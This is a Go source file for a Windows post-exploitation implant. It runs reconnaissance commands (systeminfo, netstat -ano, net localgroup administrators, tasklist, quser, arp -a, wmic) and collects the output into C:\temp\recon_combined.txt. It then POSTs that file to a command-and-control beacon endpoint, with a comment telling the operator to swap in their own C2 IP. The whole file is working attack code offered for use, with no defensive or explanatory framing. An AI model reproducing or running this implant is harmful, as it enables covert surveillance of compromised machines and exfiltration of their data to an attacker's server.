package main

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"time"
)

func main() {
	os.MkdirAll(`C:\temp`, 0755)
	timestamp := time.Now().Format("2006-01-02 15:04:05")

	var content string

	// === SECTION 1: HEADER ===
	content += fmt.Sprintf("=== RECONNAISSANCE REPORT ===\n")
	content += fmt.Sprintf("Generated: %s\n\n", timestamp)

	// === SECTION 2: NETWORK INTERFACES ===
	content += "=== NETWORK INTERFACES ===\n"
	interfaces, _ := net.Interfaces()
	for _, i := range interfaces {
		addrs, _ := i.Addrs()
		content += fmt.Sprintf("Interface: %s (%v)\n", i.Name, addrs)
	}
	content += "\n"

	// === SECTION 3: SYSTEM INFO ===
	content += "=== SYSTEM INFORMATION ===\n"
	cmd := exec.Command("cmd", "/C", "systeminfo")
	output, _ := cmd.Output()
	content += string(output) + "\n\n"

	// === S-TIER: NETWORK CONNECTIONS (netstat -ano) ===
	content += "=== 1. NETWORK CONNECTIONS ===\n"
	cmd = exec.Command("cmd", "/C", "netstat -ano")
	output, _ = cmd.Output()
	content += string(output) + "\n\n"

	// === S-TIER: LOCAL ADMINS (net localgroup administrators) ===
	content += "=== 2. LOCAL ADMINS ===\n"
	cmd = exec.Command("cmd", "/C", "net localgroup administrators")
	output, _ = cmd.Output()
	content += string(output) + "\n\n"

	// === S-TIER: RUNNING PROCESSES (tasklist /fo csv) ===
	content += "=== 3. RUNNING PROCESSES ===\n"
	cmd = exec.Command("cmd", "/C", "tasklist /fo csv")
	output, _ = cmd.Output()
	content += string(output) + "\n\n"

	// === A-TIER: LOGGED-IN USERS (quser) ===
	content += "=== 4. LOGGED-IN USERS ===\n"
	cmd = exec.Command("cmd", "/C", "quser")
	output, _ = cmd.Output()
	content += string(output) + "\n\n"

	// === A-TIER: ARP CACHE (arp -a) ===
	content += "=== 5. ARP CACHE ===\n"
	cmd = exec.Command("cmd", "/C", "arp -a")
	output, _ = cmd.Output()
	content += string(output) + "\n\n"

	// === A-TIER: DISK INFORMATION (wmic logicaldisk) ===
	content += "=== 6. DISK INFORMATION ===\n"
	cmd = exec.Command("cmd", "/C", "wmic logicaldisk get size,freespace,caption")
	output, _ = cmd.Output()
	content += string(output) + "\n\n"

	// === WRITE TO FILE ===
	path := `C:\temp\recon_combined.txt`
	os.WriteFile(path, []byte(content), 0644)

	// === C2 CALLBACK: EXFILTRATE FILE ===
	c2URL := "http://127.0.0.1:5000/beacon" // CHANGE THIS TO YOUR FLASK C2 IP
	hostname, _ := os.Hostname()
	sendToC2(c2URL, path, hostname)
}

func sendToC2(url, filepath, hostID string) {
	// Read the recon file
	data, err := os.ReadFile(filepath)
	if err != nil {
		return
	}

	// Create HTTP POST request with file as body
	req, err := http.NewRequest("POST", url, bytes.NewReader(data))
	if err != nil {
		return
	}

	// Set headers expected by Flask c2_upload.py
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Filename", "recon_combined.txt")
	req.Header.Set("X-Host", hostID)

	// Simple HTTP client with timeout
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// Optional: read response (Flask will return JSON success)
	respBody, _ := io.ReadAll(resp.Body)
	fmt.Printf("C2 Response: %s\n", string(respBody))
}
